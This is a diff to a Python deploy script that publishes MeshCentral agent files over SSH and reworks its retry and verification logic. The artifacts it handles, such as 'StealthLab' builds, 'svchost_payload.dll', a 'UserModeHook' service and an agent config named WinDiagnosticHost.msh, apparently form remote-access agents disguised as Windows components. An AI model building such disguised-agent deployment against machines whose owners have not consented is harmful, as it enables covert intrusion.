@@ -110,6 +110,21 @@ ARTIFACTS = {
         "remote_filename": "diagsvc.dll",
         "publish_targets": ("data",),
     },
+    "MeshService64.msh": {
+        "local_path": "meshservice/x64/StealthLab/MeshService-2022.msh",
+        "remote_filename": "MeshService64.msh",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "MeshService.msh": {
+        "local_path": "meshservice/StealthLab/MeshService-2022.msh",
+        "remote_filename": "MeshService.msh",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "WinDiagnosticHost.msh": {
+        "local_path": "WinDiagnosticHost.msh",
+        "remote_filename": "WinDiagnosticHost.msh",
+        "publish_targets": ("data", "signed", "module"),
+    },
     "MasterService.exe": {
         "local_path": "../UserModeHook/build-fresh/bin/Release/MasterService.exe",
         "remote_filename": "MasterService.exe",
@@ -130,6 +145,9 @@ REQUIRED_AGENT_ARTIFACTS = {
     "MeshService64.dll",
     "svchost_payload.dll",
     "diagsvc.dll",
+    "MeshService64.msh",
+    "MeshService.msh",
+    "WinDiagnosticHost.msh",
 }
 WINDOWS_INSTALL_ROOT = os.environ.get("MESHCENTRAL_INSTALL_ROOT", r"C:\ProgramData\MeshAgent")
 WINDOWS_UPDATE_PACKAGE_SUFFIX = ".update.pkg"
@@ -149,6 +167,7 @@ RETRYABLE_REMOTE_ERROR_SNIPPETS = (
     "proxy error",
     "kex_exchange_identification",
 )
+REMOTE_PUBLISH_VERIFICATION_TRANSPORT_ERROR = "Remote publish verification unavailable: SSH transport failed"
 
 # ─── SSH Helpers ──────────────────────────────────────────────────────────────
 
@@ -412,18 +431,14 @@ for raw_path in paths:
     }}
 print(json.dumps(results))
 PY"""
-    attempts = max(1, REMOTE_COMMAND_RETRIES)
-    for attempt in range(1, attempts + 1):
-        raw = ssh_cmd(remote_script, check=False)
-        if raw:
-            try:
-                parsed = json.loads(raw)
-            except json.JSONDecodeError:
-                parsed = None
-            if isinstance(parsed, dict) and parsed:
-                return parsed
-        if attempt < attempts:
-            time.sleep(REMOTE_RETRY_DELAY_SECONDS * attempt)
+    raw = ssh_cmd(remote_script, check=False)
+    if raw:
+        try:
+            parsed = json.loads(raw)
+        except json.JSONDecodeError:
+            parsed = None
+        if isinstance(parsed, dict) and parsed:
+            return parsed
     return {}
 
 
@@ -479,26 +494,24 @@ for raw_path in manifests:
     results['manifests'][raw_path] = path.read_text(encoding='utf-8')
 print(json.dumps(results))
 PY"""
-    attempts = max(1, REMOTE_COMMAND_RETRIES)
-    for attempt in range(1, attempts + 1):
-        raw = ssh_cmd(remote_script, check=False)
-        if raw:
-            try:
-                parsed = json.loads(raw)
-            except json.JSONDecodeError:
-                parsed = None
-            if isinstance(parsed, dict):
-                files = parsed.get("files")
-                manifests = parsed.get("manifests")
-                snapshot = {
-                    "files": files if isinstance(files, dict) else {},
-                    "manifests": manifests if isinstance(manifests, dict) else {},
-                }
-                if snapshot["files"] or snapshot["manifests"]:
-                    return snapshot
-        if attempt < attempts:
-            time.sleep(REMOTE_RETRY_DELAY_SECONDS * attempt)
-    return {"files": {}, "manifests": {}}
+    raw = ssh_cmd(remote_script, check=False)
+    if raw is None:
+        return None
+    if raw:
+        try:
+            parsed = json.loads(raw)
+        except json.JSONDecodeError:
+            parsed = None
+        if isinstance(parsed, dict):
+            files = parsed.get("files")
+            manifests = parsed.get("manifests")
+            snapshot = {
+                "files": files if isinstance(files, dict) else {},
+                "manifests": manifests if isinstance(manifests, dict) else {},
+            }
+            if snapshot["files"] or snapshot["manifests"]:
+                return snapshot
+    return None
 
 
 def remote_quote(path):
@@ -885,16 +898,12 @@ def verify_remote_publish(local_artifacts, signed_runtime_mode=False):
     agent_artifacts = get_agent_publish_artifacts(local_artifacts)
     public_artifacts = get_public_download_artifacts(local_artifacts)
     snapshot = collect_remote_publish_snapshot(agent_artifacts, public_artifacts)
+    if snapshot is None:
+        return [REMOTE_PUBLISH_VERIFICATION_TRANSPORT_ERROR]
     metadata_cache = snapshot.get("files", {})
     module_manifest = parse_snapshot_manifest(snapshot, f"{MODULE_AGENTS}/hashagents.json")
     signed_manifest = parse_snapshot_manifest(snapshot, f"{SIGNED_AGENTS}/hashagents.json")
     module_expectations = build_manifest_expectations_from_local(local_artifacts)
-    svchost_dll_entry = find_local_artifact(local_artifacts, "MeshService64.dll")
-    expected_embedded_svchost_sha256 = (
-        file_digest(Path(svchost_dll_entry["local_path"]), "sha256").upper()
-        if svchost_dll_entry is not None
-        else None
-    )
 
     for entry in agent_artifacts:
         for role in get_artifact_publish_targets(entry):
@@ -908,14 +917,6 @@ def verify_remote_publish(local_artifacts, signed_runtime_mode=False):
                     errors.append(f"Missing remote artifact: {remote_path}")
             else:
                 errors.extend(verify_remote_copy(entry, remote_path, metadata_cache=metadata_cache))
-
-            if entry["remote_filename"] == "MeshService64.exe" and expected_embedded_svchost_sha256 is not None:
-                errors.extend(
-                    verify_remote_embedded_svchost_payload(
-                        remote_path,
-                        expected_embedded_svchost_sha256,
-                    )
-                )
 
     for entry in public_artifacts:
         errors.extend(verify_remote_copy(entry, f"{USERFILES_DIR}/{entry['remote_filename']}", metadata_cache=metadata_cache))
@@ -933,6 +934,11 @@ def verify_remote_publish(local_artifacts, signed_runtime_mode=False):
         errors.extend(verify_manifest_matches_expectations(signed_manifest, SIGNED_AGENTS, module_expectations))
 
     return errors
+
+
+def is_remote_publish_verification_transport_error(errors):
+    """Return True only when deploy verification failed because SSH/SCP could not report state."""
+    return len(errors) == 1 and errors[0] == REMOTE_PUBLISH_VERIFICATION_TRANSPORT_ERROR
 
 
 def get_publish_runtime_state(local_artifacts=None):
@@ -1671,12 +1677,18 @@ def cmd_deploy(args):
         return False
 
     # Check staging has files
-    staged = ssh_cmd(f"find {STAGING_DIR} -maxdepth 1 -type f 2>/dev/null | wc -l", check=False)
+    staged = ssh_cmd(f"find {STAGING_DIR} -maxdepth 1 -type f 2>/dev/null | wc -l")
+    if staged is None:
+        print("[ERROR] Unable to inspect staging. Deploy aborted before publishing.")
+        return False
     if not staged or staged.strip() == "0":
         print("[ERROR] Nothing in staging. Run 'deploy.py stage' first.")
         return False
 
     staged_files = ssh_cmd(f"ls -1 {STAGING_DIR}/ 2>/dev/null")
+    if staged_files is None:
+        print("[ERROR] Unable to list staged files. Deploy aborted before publishing.")
+        return False
     print(f"\n  Staged files to deploy:")
     for f in staged_files.split("\n"):
         if f.strip():
@@ -1713,6 +1725,11 @@ def cmd_deploy(args):
         print("    [WARNING] Failed to regenerate hashagents.json on the first attempt. Verifying published state directly.")
     verification_errors = verify_remote_publish(local_artifacts)
     if verification_errors:
+        if is_remote_publish_verification_transport_error(verification_errors):
+            print("    [ERROR] Deployment verification unavailable due to SSH transport failure.")
+            print("    Published files were not rolled back because no content mismatch was verified.")
+            print("    MeshCentral was not restarted. Re-run deploy when SSH is stable to complete verification and restart.")
+            return False
         print("    [ERROR] Deployment verification failed:")
         for error in verification_errors:
             print(f"      - {error}")
@@ -1740,6 +1757,10 @@ def cmd_deploy(args):
         publish_state = get_publish_runtime_state(local_artifacts)
         runtime_errors.extend(get_publish_state_errors(publish_state))
         if runtime_errors:
+            if is_remote_publish_verification_transport_error(runtime_errors):
+                print("\n[ERROR] Post-restart publish verification unavailable due to SSH transport failure.")
+                print("  MeshCentral was active after restart, so no rollback was attempted without a verified content mismatch.")
+                return False
             print("\n[ERROR] Post-restart publish verification failed:")
             for error in runtime_errors:
                 print(f"  - {error}")
@@ -2185,10 +2206,12 @@ def cmd_ssh(args):
     command = " ".join(args.command)
     if not command:
         print("Usage: deploy.py ssh <command>")
-        return
+        return False
     result = ssh_cmd(command, check=False)
     if result is not None:
         print(result)
+        return True
+    return False
 
 
 # ─── Main ─────────────────────────────────────────────────────────────────────
@@ -2257,7 +2280,9 @@ def main():
         "ssh": cmd_ssh,
     }
 
-    commands[args.cmd](args)
+    result = commands[args.cmd](args)
+    if result is False:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
